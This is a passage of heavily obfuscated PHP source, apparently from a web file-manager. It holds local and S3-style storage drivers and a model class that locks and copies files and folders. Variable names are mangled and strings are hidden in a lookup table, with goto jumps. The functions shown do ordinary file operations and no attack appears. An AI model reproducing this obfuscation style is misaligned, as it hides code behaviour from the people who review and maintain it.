@rename($ÆŠÕÇÔÛ, $ˆïÈñØŞ); $ˆïÈñØŞ = $this->iconvApp($ˆïÈñØŞ); if ($Ñ„Õâ›) { return $this->getPathOuter($ˆïÈñØŞ); } $this->writeLog(__FUNCTION__ . $¯‘¸“ş[1468], !0); return !1; } public function size($À¤ŸïÕÂ) { $À¤ŸïÕÂ = $this->iconvSystem($À¤ŸïÕÂ); return filesize_64($À¤ŸïÕÂ); } public function info($¢ØÉ¾Œ±) { $¢ØÉ¾Œ± = $this->iconvSystem($¢ØÉ¾Œ±); if ($this->isFolder($¢ØÉ¾Œ±)) { return $this->folderInfo($¢ØÉ¾Œ±); } else { if ($this->isFile($¢ØÉ¾Œ±)) { return $this->fileInfo($¢ØÉ¾Œ±); } } return !1; } protected function infoChildren($¦Ö”Á, &$÷É ÒŸ¦, $ µ¾Õ = true) { $®íêŸˆ© =& $_SERVER[‹‰”››ê]; check_abort_echo(); $¦Ö”Á = rtrim($¦Ö”Á, $®íêŸˆ©[8]) . $®íêŸˆ©[8]; if ($ µ¾Õ) { $¦Ö”Á = $this->iconvSystem($¦Ö”Á); } if (!($ÆºÒïÁË = @opendir($¦Ö”Á))) { return; } while (($ÕŒÁÎ×© = readdir($ÆºÒïÁË)) !== !1) { if ($ÕŒÁÎ×© == $®íêŸˆ©[10] || $ÕŒÁÎ×© == $®íêŸˆ©[1379]) { continue; } $ä˜¬ÈØ¦ = $¦Ö”Á . $ÕŒÁÎ×©; if (is_file($ä˜¬ÈØ¦) || is_link($ä˜¬ÈØ¦)) { $÷É ÒŸ¦[$®íêŸˆ©[80]]++; $÷É ÒŸ¦[$®íêŸˆ©[79]] += filesize_64($ä˜¬ÈØ¦); } else { if (is_dir($ä˜¬ÈØ¦)) { $÷É ÒŸ¦[$®íêŸˆ©[81]]++; $this->infoChildren($ä˜¬ÈØ¦, $÷É ÒŸ¦, !1); } } } closedir($ÆºÒïÁË); } private function folderInfo($ğØá“¢¥, $º’øĞ ò = false) { $Ö³ †´‡ =& $_SERVER[‹‰”››ê]; $ğØá“¢¥ = rtrim($ğØá“¢¥, $Ö³ †´‡[8]) . $Ö³ †´‡[8]; $ş–ÖÙí± = $this->iconvApp($this->pathThis($ğØá“¢¥)); if ($º’øĞ ò) { return array($Ö³ †´‡[32] => $ş–ÖÙí±, $Ö³ †´‡[87] => $this->getPathOuter($ğØá“¢¥), $Ö³ †´‡[33] => $Ö³ †´‡[78]); } $Õ¼ÈŸàŠ = array($Ö³ †´‡[32] => $ş–ÖÙí±, $Ö³ †´‡[87] => $this->getPathOuter($ğØá“¢¥), $Ö³ †´‡[33] => $Ö³ †´‡[78], $Ö³ †´‡[234] => @filectime($ğØá“¢¥), $Ö³ †´‡[88] => @filemtime($ğØá“¢¥), $Ö³ †´‡[1472] => @fileatime($ğØá“¢¥), $Ö³ †´‡[1473] => is_readable($ğØá“¢¥), $Ö³ †´‡[1474] => is_writable($ğØá“¢¥), $Ö³ †´‡[1475] => get_mode($ğØá“¢¥)); return $Õ¼ÈŸàŠ; } private function fileInfo($ĞæáäÁâ, $¦åÎØ¤ = false) { $¿åğ‘Á =& $_SERVER[‹‰”››ê]; $œ¯ù†É¾ = $this->iconvApp($this->pathThis($ĞæáäÁâ)); if ($¦åÎØ¤) { return array($¿åğ‘Á[32] => $œ¯ù†É¾, $¿åğ‘Á[87] => $this->getPathOuter($ĞæáäÁâ), $¿åğ‘Á[33] => $¿åğ‘Á[233], $¿åğ‘Á[79] => $this->size($ĞæáäÁâ), $¿åğ‘Á[169] => $this->ext($œ¯ù†É¾)); } $ü¶Ìº¾ = array($¿åğ‘Á[32] => $œ¯ù†É¾, $¿åğ‘Á[87] => $this->getPathOuter($ĞæáäÁâ), $¿åğ‘Á[33] => $¿åğ‘Á[233], $¿åğ‘Á[234] => @filectime($ĞæáäÁâ), $¿åğ‘Á[88] => @filemtime($ĞæáäÁâ), $¿åğ‘Á[1472] => @fileatime($ĞæáäÁâ), $¿åğ‘Á[79] => $this->size($ĞæáäÁâ), $¿åğ‘Á[169] => $this->ext($œ¯ù†É¾), $¿åğ‘Á[1473] => is_readable($ĞæáäÁâ), $¿åğ‘Á[1474] => is_writable($ĞæáäÁâ), $¿åğ‘Á[1475] => get_mode($ĞæáäÁâ)); return $ü¶Ìº¾; } public function exist($Ğ‰Ÿï¢¡) { $Ğ‰Ÿï¢¡ = $this->iconvSystem($Ğ‰Ÿï¢¡); return @file_exists($Ğ‰Ÿï¢¡); } public function isFile($ÇÛ–Ä´) { $ÇÛ–Ä´ = $this->iconvSystem($ÇÛ–Ä´); return @is_file($ÇÛ–Ä´); } public function isFolder($•ºÜ…»£) { $•ºÜ…»£ = $this->iconvSystem($•ºÜ…»£); return @is_dir($•ºÜ…»£); } public function listPath($òä³Â®İ, $ß¯ĞØêÆ = false) { $òˆÓ™öö =& $_SERVER[‹‰”››ê]; $òä³Â®İ = $this->iconvSystem($òä³Â®İ); $òä³Â®İ = rtrim($òä³Â®İ, $òˆÓ™öö[8]) . $òˆÓ™öö[8]; $áû ‰Ü• = array($òˆÓ™öö[85] => array(), $òˆÓ™öö[86] => array()); if (!($â«ğ‡¾Ô = @opendir($òä³Â®İ))) { return $áû ‰Ü•; } while (($—¤ĞØ„ = readdir($â«ğ‡¾Ô)) !== !1) { if ($—¤ĞØ„ == $òˆÓ™öö[10] || $—¤ĞØ„ == $òˆÓ™öö[1379]) { continue; } $‚ÂÇŠÈ = $òä³Â®İ . $—¤ĞØ„; if (is_file($‚ÂÇŠÈ)) { $áû ‰Ü•[$òˆÓ™öö[86]][] = $this->fileInfo($‚ÂÇŠÈ, $ß¯ĞØêÆ); } else { $áû ‰Ü•[$òˆÓ™öö[85]][] = $this->folderInfo($‚ÂÇŠÈ, $ß¯ĞØêÆ); } } closedir($â«ğ‡¾Ô); return $áû ‰Ü•; } public function listAll($ÛÜ½—”ª, &$ŠÊŸÆª… = array()) { $Ğ¿õÇğÔ =& $_SERVER[‹‰”››ê]; $ÛÜ½—”ª = $this->iconvSystem($ÛÜ½—”ª); $ÛÜ½—”ª = rtrim($ÛÜ½—”ª, $Ğ¿õÇğÔ[8]) . $Ğ¿õÇğÔ[8]; if (!($–¡±šôÆ = @opendir($ÛÜ½—”ª))) { return $ŠÊŸÆª…; } while (($Óù¤ÚÓÊ = readdir($–¡±šôÆ)) !== !1) { if ($Óù¤ÚÓÊ == $Ğ¿õÇğÔ[10] || $Óù¤ÚÓÊ == $Ğ¿õÇğÔ[1379]) { continue; } $àŒ¶­ = $ÛÜ½—”ª . $Óù¤ÚÓÊ; $ë”ŞòŞ« = is_dir($àŒ¶­) && !is_link($àŒ¶­) ? 1 : 0; $àŒ¶­ = $ë”ŞòŞ« ? $àŒ¶­ . $Ğ¿õÇğÔ[8] : $àŒ¶­; $ŠÊŸÆª…[] = array($Ğ¿õÇğÔ[87] => $this->getPathOuter($àŒ¶­), $Ğ¿õÇğÔ[78] => $ë”ŞòŞ«, $Ğ¿õÇğÔ[88] => intval(@filemtime($àŒ¶­)), $Ğ¿õÇğÔ[79] => $ë”ŞòŞ« ? 0 : intval($this->size($àŒ¶­))); if ($ë”ŞòŞ«) { $this->listAll($àŒ¶­, $ŠÊŸÆª…); } } closedir($–¡±šôÆ); return $ŠÊŸÆª…; } public function has($Â€·ƒ½Ç, $¶–µáÚ¢ = false, $Øä¹ÃµÈ = true) { $û‹±ìıİ =& $_SERVER[‹‰”››ê]; $Â€·ƒ½Ç = $this->iconvSystem($Â€·ƒ½Ç); $Â€·ƒ½Ç = rtrim($Â€·ƒ½Ç, $û‹±ìıİ[8]) . $û‹±ìıİ[8]; if (!($Ú§¿•ğ° = @opendir($Â€·ƒ½Ç))) { return !1; } $ñªßöŠ¨ = 0; $Ï˜‘¡ÔÉ = 0; $îÉÃ¤ÕÊ = 0; while (($«Üù¬¶ = readdir($Ú§¿•ğ°)) !== !1) { if ($«Üù¬¶ == $û‹±ìıİ[10] || $«Üù¬¶ == $û‹±ìıİ[1379]) { continue; } $©ÊãÕ«¨ = $Â€·ƒ½Ç . $«Üù¬¶; if ($¶–µáÚ¢) { $îÉÃ¤ÕÊ++; if (@is_file($©ÊãÕ«¨)) { $ñªßöŠ¨++; } else { $Ï˜‘¡ÔÉ++; } if ($îÉÃ¤ÕÊ > 10000) { break; } continue; } if ($Øä¹ÃµÈ) { if (@is_file($©ÊãÕ«¨)) { return !0; } } else { if (@is_dir($©ÊãÕ«¨ . $û‹±ìıİ[8])) { return !0; } } } closedir($Ú§¿•ğ°); if ($¶–µáÚ¢) { return array($û‹±ìıİ[242] => $ñªßöŠ¨, $û‹±ìıİ[243] => $Ï˜‘¡ÔÉ); } return !1; } public function hashSimple($š‰Ò¸ÀŞ) { $îÁé”‚” =& $_SERVER[‹‰”››ê]; if (!$š‰Ò¸ÀŞ) { return md5($îÁé”‚”[12]); } $š‰Ò¸ÀŞ = $this->iconvSystem($š‰Ò¸ÀŞ); $Æ¬ µÄ = $this->size($š‰Ò¸ÀŞ); $Â•šì¡Å = 200; $ƒÄ Ä“ = 50; if ($Æ¬ µÄ <= $Â•šì¡Å * $ƒÄ Ä“) { return $this->hashMd5($š‰Ò¸ÀŞ) . $Æ¬ µÄ; } $ñ‹¨Ã¦ï = $îÁé”‚”[12]; $÷¹ëØçÔ = intval($Æ¬ µÄ / $ƒÄ Ä“); $–ğğÓ¾Ï = fopen($š‰Ò¸ÀŞ, $îÁé”‚”[1476]); if (!$–ğğÓ¾Ï) { return $ñ‹¨Ã¦ï; } for ($˜’åÉÆ— = 0; $˜’åÉÆ— < $ƒÄ Ä“; $˜’åÉÆ—++) { fseek_64($–ğğÓ¾Ï, $÷¹ëØçÔ * $˜’åÉÆ—); $ñ‹¨Ã¦ï .= fread($–ğğÓ¾Ï, $Â•šì¡Å); } fseek_64($–ğğÓ¾Ï, $Æ¬ µÄ - $Â•šì¡Å); $ñ‹¨Ã¦ï .= fread($–ğğÓ¾Ï, $Â•šì¡Å); fclose($–ğğÓ¾Ï); return md5($ñ‹¨Ã¦ï) . $Æ¬ µÄ; } public function getContent($ø“Ç®Ø) { $ø“Ç®Ø = $this->iconvSystem($ø“Ç®Ø); return file_get_contents($ø“Ç®Ø); } public function setContent($İ»É‹°, $Ø‡íµÈ‚ = '') { $İ»É‹° = $this->iconvSystem($İ»É‹°); $ù•ò›á¬ = @file_put_contents($İ»É‹°, $Ø‡íµÈ‚, LOCK_EX); if (!$ù•ò›á¬) { $this->writeLog(__FUNCTION__ . $_SERVER[‹‰”››ê][1468], !0); } clearstatcache(); @chmod($İ»É‹°, $this->pathAuth); return $ù•ò›á¬ === !1 ? !1 : !0; } public function fileSubstr($š·ÙÕ˜‚, $•À‘ºø = 0, $Æ§±ˆã¿ = false) { $ğÜØÊš• =& $_SERVER[‹‰”››ê]; $š·ÙÕ˜‚ = $this->iconvSystem($š·ÙÕ˜‚); if ($Æ§±ˆã¿ === !1) { $Æ§±ˆã¿ = $this->size($š·ÙÕ˜‚); } if ($Æ§±ˆã¿ <= 0) { return $ğÜØÊš•[12]; } $Ğº÷ôÄ€ = fopen($š·ÙÕ˜‚, $ğÜØÊš•[1476]); if (!$Ğº÷ôÄ€) { return !1; } fseek_64($Ğº÷ôÄ€, $•À‘ºø); $éîêê¾Å = fread($Ğº÷ôÄ€, $Æ§±ˆã¿); fclose($Ğº÷ôÄ€); if (!$éîêê¾Å) { $this->writeLog(__FUNCTION__ . $ğÜØÊš•[1468], !0); } return $éîêê¾Å; } public function upload($Õ¡”Ùü•, $ï¨ñ½›ä, $Å’óÓ¡¤ = false, $û×…›ã  = REPEAT_REPLACE) { if ($Å’óÓ¡¤) { return $this->moveFile($ï¨ñ½›ä, $Õ¡”Ùü•); } return $this->copyFile($ï¨ñ½›ä, $Õ¡”Ùü•); } public function setModifyTime($ù€à·™, $è½çó¨³ = '') { @touch($ù€à·™, intval($è½çó¨³)); } public function download($•ÛÙîô, $­‰½ØœÀ) { return $this->iconvSystem($•ÛÙîô); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($Úíëö¯ƒ) { parent::__construct($Úíëö¯ƒ); $this->setSignVersion($_SERVER[‹‰”››ê][250]); } public function fileOutImage($§²³—™‹, $êí‹Ûİ = 250) { $‰»í‘Åª =& $_SERVER[‹‰”››ê]; if ($this->size($§²³—™‹) > 1024 * 1024 * 25) { return $this->fileOutImageServer($§²³—™‹, $êí‹Ûİ); } $Òëğ›ĞÓ = array($‰»í‘Åª[1477] => $‰»í‘Åª[1478] . $êí‹Ûİ . $‰»í‘Åª[1479]); $ãÖ½±º” = $this->link($§²³—™‹, $Òëğ›ĞÓ); $this->fileOutLink($ãÖ½±º”); } public function fileOutLink($ÆæêË·) { $ı¶¡›Ï» =& $_SERVER[‹‰”››ê]; if (substr($ÆæêË·, 0, 7) == $ı¶¡›Ï»[219]) { $ÆæêË· = $ı¶¡›Ï»[220] . substr($ÆæêË·, 7); } header($ı¶¡›Ï»[175] . $ÆæêË·); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($²Îş¦ê”) { parent::__construct($²Îş¦ê”); $this->setSignVersion($_SERVER[‹‰”››ê][250]); } public function fileOutLink($³ïÏÌÊÎ) { $Š¤Œş =& $_SERVER[‹‰”››ê]; if (substr($³ïÏÌÊÎ, 0, 7) == $Š¤Œş[219]) { $³ïÏÌÊÎ = $Š¤Œş[220] . substr($³ïÏÌÊÎ, 7); } header($Š¤Œş[175] . $³ïÏÌÊÎ); die; } public function uploadFormData($——¡”šÖ, $ÆøÙô„ò = 3600) { return $this->uploadFormDataV2($——¡”šÖ, $ÆøÙô„ò); } } goto DÉÒÌ»”£“; Eøøàå·ğÀ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($â‚ˆù€ó) { $÷İ½…Ê¬ =& $_SERVER[‹‰”››ê]; if (!$this->allowLock()) { return; } $this->_lockCheck($÷İ½…Ê¬[635], $â‚ˆù€ó); $Ç¡Ãâò¹ = 1; $this->_lockEvent($â‚ˆù€ó, array($÷İ½…Ê¬[636], $÷İ½…Ê¬[637]), $Ç¡Ãâò¹); $this->_lockParent($â‚ˆù€ó, array($÷İ½…Ê¬[637]), $Ç¡Ãâò¹); $this->_lockEvent($â‚ˆù€ó, array($÷İ½…Ê¬[638], $÷İ½…Ê¬[639]), $Ç¡Ãâò¹); $this->_lockCheckEnd($÷İ½…Ê¬[635], $â‚ˆù€ó); } public function lockCopyEnd($ûïäÅ²Ç) { $ªåÚåÙİ =& $_SERVER[‹‰”››ê]; if (!$this->allowLock()) { return; } $™öè œü = 0; $this->_lockEvent($ûïäÅ²Ç, array($ªåÚåÙİ[636], $ªåÚåÙİ[637]), $™öè œü); $this->_lockParent($ûïäÅ²Ç, array($ªåÚåÙİ[637]), $™öè œü); $this->_lockEvent($ûïäÅ²Ç, array($ªåÚåÙİ[638], $ªåÚåÙİ[639]), $™öè œü); } public function lockWriteStart($ÜÔâ·¶, $‚›ÇØ’ = '') { $—ö¸Å =& $_SERVER[‹‰”››ê]; if (!$this->allowLock()) { return; } $this->_lockCheck($—ö¸Å[636], $ÜÔâ·¶); $áí®™œÇ = 1; $this->_lockKey($—ö¸Å[640] . $ÜÔâ·¶ . $—ö¸Å[10] . $‚›ÇØ’, $áí®™œÇ); $this->_lockEvent($ÜÔâ·¶, array($—ö¸Å[635], $—ö¸Å[637]), $áí®™œÇ); $this->_lockParent($ÜÔâ·¶, array($—ö¸Å[635], $—ö¸Å[637]), $áí®™œÇ); $this->_lockCheckEnd($—ö¸Å[636], $ÜÔâ·¶); } public function lockWriteEnd($€ïñ¿Å, $Ù£¯ÎÂ‹ = '') { $ØØÚ‰½¿ =& $_SERVER[‹‰”››ê]; if (!$this->allowLock()) { return; } $¨½Ğø§¾ = 0; $this->_lockKey($ØØÚ‰½¿[640] . $€ïñ¿Å . $ØØÚ‰½¿[10] . $Ù£¯ÎÂ‹, $¨½Ğø§¾); $this->_lockEvent($€ïñ¿Å, array($ØØÚ‰½¿[635], $ØØÚ‰½¿[637]), $¨½Ğø§¾); $this->_lockParent($€ïñ¿Å, array($ØØÚ‰½¿[635], $ØØÚ‰½¿[637]), $¨½Ğø§¾); } public function lockMoveStart($ÈûÁÓíä) { $öÇ¶ö—û =& $_SERVER[‹‰”››ê]; if (!$this->allowLock()) { return; } $this->_lockCheck($öÇ¶ö—û[637], $ÈûÁÓíä); $¬ØÉŸÄ = 1; $this->_lockKey($öÇ¶ö—û[641] . $ÈûÁÓíä, $¬ØÉŸÄ); $this->_lockEvent($ÈûÁÓíä, array($öÇ¶ö—û[635], $öÇ¶ö—û[636]), $¬ØÉŸÄ); $this->_lockParent($ÈûÁÓíä, array($öÇ¶ö—û[635], $öÇ¶ö—û[637]), $¬ØÉŸÄ); $this->_lockEvent($ÈûÁÓíä, array($öÇ¶ö—û[642], $öÇ¶ö—û[638], $öÇ¶ö—û[639]), $¬ØÉŸÄ); $this->_lockCheckEnd($öÇ¶ö—û[637], $ÈûÁÓíä); } public function lockMoveEnd($ğéÏ›ü) { $¡îÂı­Í =& $_SERVER[‹‰”››ê]; if (!$this->allowLock()) { return; } $ãƒü¦÷¸ = 0; $this->_lockKey($¡îÂı­Í[641] . $ğéÏ›ü, $ãƒü¦÷¸); $this->_lockEvent($ğéÏ›ü, array($¡îÂı­Í[635], $¡îÂı­Í[636]), $ãƒü¦÷¸); $this->_lockParent($ğéÏ›ü, array($¡îÂı­Í[635], $¡îÂı­Í[637]), $ãƒü¦÷¸); $this->_lockEvent($ğéÏ›ü, array($¡îÂı­Í[642], $¡îÂı­Í[638], $¡îÂı­Í[639]), $ãƒü¦÷¸); } private function _lockCheck($¦Ğ­Ú¼›, $·ÜŠÓâÑ) { $ã·€Á¤« =& $_SERVER[‹‰”››ê]; $œ¡Çë„ì = $this->sourceInfo($·ÜŠÓâÑ); $¶ŒÏ‹‰ê = $¦Ğ­Ú¼› . $ã·€Á¤«[10] . $·ÜŠÓâÑ; $this->_lockTimeStart[$¶ŒÏ‹‰ê] = timeFloat(); if (!is_array($œ¡Çë„ì)) { return; } $®Ş‹ïÁğ = LNG($ã·€Á¤«[643]); CacheLock::setErrorMsg($ã·€Á¤«[176] . htmlspecialchars($œ¡Çë„ì[$ã·€Á¤«[32]]) . $ã·€Á¤«[178] . $®Ş‹ïÁğ); $this->_lockKey($¶ŒÏ‹‰ê, 1); $this->_lockKey($¶ŒÏ‹‰ê, 0); $¾ÕÆÓÇñ = array_reverse($this->parentLevelArray($œ¡Çë„ì[$ã·€Á¤«[598]])); foreach ($¾ÕÆÓÇñ as $ìÚ·ÃíĞ) { $¶ŒÏ‹‰ê = $¦Ğ­Ú¼› . $ã·€Á¤«[644] . $ìÚ·ÃíĞ; if (CacheLock::lockGet($ã·€Á¤«[645] . $¶ŒÏ‹‰ê)) { $œ¡Çë„ì = $this->sourceInfo($ìÚ·ÃíĞ); CacheLock::setErrorMsg($ã·€Á¤«[176] . htmlspecialchars($œ¡Çë„ì[$ã·€Á¤«[32]]) . $ã·€Á¤«[178] . $®Ş‹ïÁğ); $this->_lockKey($¶ŒÏ‹‰ê, 1); $this->_lockKey($¶ŒÏ‹‰ê, 0); } } } private function _lockCheckEnd($…·ØÖ£, $íÏ ÒŸ) { $Ææ°¬¯ =& $_SERVER[‹‰”››ê]; $ûäØŸ· = $…·ØÖ£ . $Ææ°¬¯[10] . $íÏ ÒŸ; CacheLock::setErrorMsg($Ææ°¬¯[466]); if (!isset($this->_lockTimeStart[$ûäØŸ·])) { return; } $Í¤š˜º = timeFloat() - $this->_lockTimeStart[$ûäØŸ·]; unset($this->_lockTimeStart[$ûäØŸ·]); if ($Í¤š˜º > 0.5) { unset(self::$cacheSourceInfo[$Ææ°¬¯[545] . $íÏ ÒŸ]); } $®Ğßè™İ = $this->sourceInfo($íÏ ÒŸ); if (!$®Ğßè™İ) { show_json(LNG($Ææ°¬¯[108]), !1); } } private function _lockParent($ˆïğ ¥Ã, $°‡‘®¹ö, $êåñí›Â) { if (!$this->autoLockSet) { return; } $œ•öÕ«ƒ = $this->sourceInfo($ˆïğ ¥Ã); if (!is_array($œ•öÕ«ƒ)) { return; } $ªËÜ¢¾ = array_reverse($this->parentLevelArray($œ•öÕ«ƒ[$_SERVER[‹‰”››ê][598]])); foreach ($ªËÜ¢¾ as $ÎÇª¥Á) { $this->_lockEvent($ÎÇª¥Á, $°‡‘®¹ö, $êåñí›Â); } } private function _lockEvent($ÃÚØ™±ä, $˜ôø¶ã, $àñŞß™ò) { $ÊÍ°åò¨ =& $_SERVER[‹‰”››ê]; if (!$this->autoLockSet) { return; } foreach ($˜ôø¶ã as $€ªù§Á) { $¿³“œó¢ = $€ªù§Á . $ÊÍ°åò¨[10] . $ÃÚØ™±ä; if ($àñŞß™ò && CacheLock::lockGet($ÊÍ°åò¨[645] . $¿³“œó¢)) { continue; } $this->_lockKey($¿³“œó¢, $àñŞß™ò); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Ë‹âöõ§, $€†‡øÀ¾ = 1) { $Îá¤´ßç = $_SERVER[‹‰”››ê][645] . md5($Ë‹âöõ§); if ($€†‡øÀ¾) { if (isset(self::$_lockItemArr[$Îá¤´ßç])) { return; } self::$_lockItemArr[$Îá¤´ßç] = 1; CacheLock::lock($Îá¤´ßç, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Îá¤´ßç])) { return; } unset(self::$_lockItemArr[$Îá¤´ßç]); CacheLock::unlock($Îá¤´ßç); } } public function isParentOf($¬˜¤Ä­–, $¡Öé¸ƒˆ) { $Ÿ™Ö¶İ¦ =& $_SERVER[‹‰”››ê]; $òÕ™±´Ş = $this->sourceInfo($¬˜¤Ä­–); $òÆãŠÀ‡ = $this->sourceInfo($¡Öé¸ƒˆ); $‚Çš‹­Ş = $òÕ™±´Ş[$Ÿ™Ö¶İ¦[598]] . $òÕ™±´Ş[$Ÿ™Ö¶İ¦[194]] . $Ÿ™Ö¶İ¦[50]; $¿›µß¾ö = $òÆãŠÀ‡[$Ÿ™Ö¶İ¦[598]] . $òÆãŠÀ‡[$Ÿ™Ö¶İ¦[194]] . $Ÿ™Ö¶İ¦[50]; $’¢ŞÓŸ = strpos($¿›µß¾ö, $‚Çš‹­Ş) === 0; return $’¢ŞÓŸ; } private $targetIsDelete = 0; public function copy($Ø¼’†¢ı, $†Ğ¸Ú¾ç, $ªÌÂÑ×• = REPEAT_REPLACE, $˜Ğ‹äî³ = '') { $­Ÿ¾Œ¨ =& $_SERVER[‹‰”››ê]; $´Éì­ÌÂ = $this->sourceInfo($Ø¼’†¢ı); $ÅºçÖ¼ = $this->sourceInfo($†Ğ¸Ú¾ç); if (!$´Éì­ÌÂ || !$ÅºçÖ¼ || $ÅºçÖ¼[$­Ÿ¾Œ¨[497]] != $­Ÿ¾Œ¨[91]) { return !1; } if ($this->isParentOf($Ø¼’†¢ı, $†Ğ¸Ú¾ç)) { return !1; } $ı±«Øüï = $˜Ğ‹äî³ ? $˜Ğ‹äî³ : $´Éì­ÌÂ[$­Ÿ¾Œ¨[32]]; $this->lockCopyStart($Ø¼’†¢ı); $this->lockWriteStart($†Ğ¸Ú¾ç, $ı±«Øüï); $ı±©¬ûÊ = array($­Ÿ¾Œ¨[646] => array(), $­Ÿ¾Œ¨[647] => array(), $­Ÿ¾Œ¨[648] => array()); $this->targetIsDelete = intval($´Éì­ÌÂ[$­Ÿ¾Œ¨[517]]); $Êî’ ë£ = $this->fileNameExistAuto($†Ğ¸Ú¾ç, $´Éì­ÌÂ); $±îÇ®éÉ = $this->_copy($Ø¼’†¢ı, $†Ğ¸Ú¾ç, $ªÌÂÑ×•, $ı±©¬ûÊ, !0, $˜Ğ‹äî³); $this->_childrenListClear(); $this->lockCopyEnd($Ø¼’†¢ı); $this->lockWriteEnd($†Ğ¸Ú¾ç, $ı±«Øüï); if ($´Éì­ÌÂ[$­Ÿ¾Œ¨[497]] == $­Ÿ¾Œ¨[91] && $Êî’ ë£ == $±îÇ®éÉ) { $this->folderSizeResetChildren($Êî’ ë£); } Model($­Ÿ¾Œ¨[649])->addAll($ı±©¬ûÊ[$­Ÿ¾Œ¨[647]], array(), !0); if ($Êî’ ë£ != $±îÇ®éÉ || $´Éì­ÌÂ[$­Ÿ¾Œ¨[497]] == $­Ÿ¾Œ¨[91]) { Model($­Ÿ¾Œ¨[650])->eventCopy($±îÇ®éÉ); } $this->saveAll($ı±©¬ûÊ[$­Ÿ¾Œ¨[648]]); Model($­Ÿ¾Œ¨[233])->linkAdd($ı±©¬ûÊ[$­Ÿ¾Œ¨[646]]); $this->folderSizeReset($†Ğ¸Ú¾ç); $this->updateModifyTime($†Ğ¸Ú¾ç); return $±îÇ®éÉ; } private function _copy($„ÑÖƒùã, $€öŠ«ëû, $…ÁÄ·¹, &$†Ğœ»Ç¯, $Ìã¡–ğÃ, $­ùÙğ¥² = '') { $ ¨ËŞÛÀ =& $_SERVER[‹‰”››ê]; $ÔÃš¯úş = $this->sourceInfoCache($„ÑÖƒùã); $ñì‚ü¥ = $ÔÃš¯úş[$ ¨ËŞÛÀ[497]] == $ ¨ËŞÛÀ[91]; $µ¦íé•» = $­ùÙğ¥² ? $­ùÙğ¥² : $ÔÃš¯úş[$ ¨ËŞÛÀ[32]]; $ïã–î© = $this->fileNameExistAuto($€öŠ«ëû, $ÔÃš¯úş); if ($Ìã¡–ğÃ) { $this->_childrenAllMake($„ÑÖƒùã); if ($ñì‚ü¥ && $ïã–î©) { $this->_childrenAllMake($ïã–î©); } } if (!$ïã–î©) { return $this->_copyCreate($„ÑÖƒùã, $€öŠ«ëû, $µ¦íé•», $†Ğœ»Ç¯); } $É³Š«— = $ïã–î©; if ($ñì‚ü¥) { if ($…ÁÄ·¹ == REPEAT_RENAME_FOLDER) { $µ¦íé•» = $this->fileNameAutoCache($€öŠ«ëû, $µ¦íé•», $…ÁÄ·¹, $ñì‚ü¥); $É³Š«— = $this->_copyCreate($„ÑÖƒùã, $€öŠ«ëû, $µ¦íé•», $†Ğœ»Ç¯); } else { $ë¾Ğã†÷ = $this->_childrenList($„ÑÖƒùã); foreach ($ë¾Ğã†÷ as $òÈÁÕ¢Ï) { $this->_copy($òÈÁÕ¢Ï[$ ¨ËŞÛÀ[194]], $ïã–î©, $…ÁÄ·¹, $†Ğœ»Ç¯, !1); } } } else { if ($…ÁÄ·¹ == REPEAT_RENAME || $…ÁÄ·¹ == REPEAT_RENAME_FOLDER) { $µ¦íé•» = $this->fileNameAutoCache($€öŠ«ëû, $µ¦íé•», $…ÁÄ·¹, $ñì‚ü¥); $É³Š«— = $this->_copyCreate($„ÑÖƒùã, $€öŠ«ëû, $µ¦íé•», $†Ğœ»Ç¯); } else { if ($…ÁÄ·¹ == REPEAT_REPLACE) { $€´²ù’ˆ = $this->sourceInfoCache($ïã–î©); $ì¢Ãº‚ = $this->fileHistory($€´²ù’ˆ, $ÔÃš¯úş[$ ¨ËŞÛÀ[555]], $ÔÃš¯úş[$ ¨ËŞÛÀ[79]]); if ($ì¢Ãº‚) { $†Ğœ»Ç¯[$ ¨ËŞÛÀ[646]][] = $ÔÃš¯úş[$ ¨ËŞÛÀ[555]]; } } else { if ($…ÁÄ·¹ == REPEAT_SKIP) { } } } Hook::trigger($ ¨ËŞÛÀ[651], array($ ¨ËŞÛÀ[652], $ÔÃš¯úş, 0)); } return $É³Š«—; } private function _copyCreate($şò–µÊá, $ÉÕ¶êÓ, $€¾Ş¦×™, &$Î²˜¥Õä) { $»»—ïßë =& $_SERVER[‹‰”››ê]; $Ü¼·ç“ = $this->sourceInfoCache($şò–µÊá); $¯å³’ = $this->sourceInfoCache($ÉÕ¶êÓ); $¹¸¨Ä â = $this->_makeItemData($Ü¼·ç“, $¯å³’, $€¾Ş¦×™); Hook::trigger($»»—ïßë[653], $¹¸¨Ä â); Hook::trigger($»»—ïßë[654], array($»»—ïßë[655], $¹¸¨Ä â, 0)); $™è«‡«› = $this->add($¹¸¨Ä â); $éì€éºë = array($»»—ïßë[194] => $™è«‡«›, $»»—ïßë[32] => $€¾Ş¦×™); $this->_copyApplyMeta($éì€éºë, $Î²˜¥Õä); if ($Ü¼·ç“[$»»—ïßë[497]] != $»»—ïßë[91]) { $Î²˜¥Õä[$»»—ïßë[646]][] = $Ü¼·ç“[$»»—ïßë[555]]; return $™è«‡«›; } $º¤‡Ú…À = array(); $–“Ô­‘Ÿ = array(); $this->_childrenListAll($şò–µÊá, $º¤‡Ú…À); $¡¼òßÍÅ = count($º¤‡Ú…À); if ($¡¼òßÍÅ == 0) { return $™è«‡«›; } $À±‡ûÒÎ = $this->sourceInfo($™è«‡«›); foreach ($º¤‡Ú…À as $°ä®Á§) { $íœ±‚¸ = $this->_makeItemData($°ä®Á§, $À±‡ûÒÎ, $°ä®Á§[$»»—ïßë[32]]); $íœ±‚¸[$»»—ïßë[598]] = $°ä®Á§[$»»—ïßë[598]]; $–“Ô­‘Ÿ[] = $íœ±‚¸; } $this->chunkEventSet($»»—ïßë[656], array($»»—ïßë[657], $¹¸¨Ä â, $¡¼òßÍÅ)); $this->addAll($–“Ô­‘Ÿ, array(), !1); $§Üúëäà = $this->where(array($»»—ïßë[193] => $™è«‡«›))->select(); $ÆÒ·î¶ = $this->_childrenMakeRelation($º¤‡Ú…À, $§Üúëäà); $ÆÒ·î¶[$şò–µÊá] = $™è«‡«›; $ÛË™Ñß = array(); $±Ÿ§ÈÆ¶ = array(); foreach ($§Üúëäà as $°ä®Á§) { $¦Ÿ¼Åæà = $°ä®Á§[$»»—ïßë[194]]; $öĞÂêÙ = 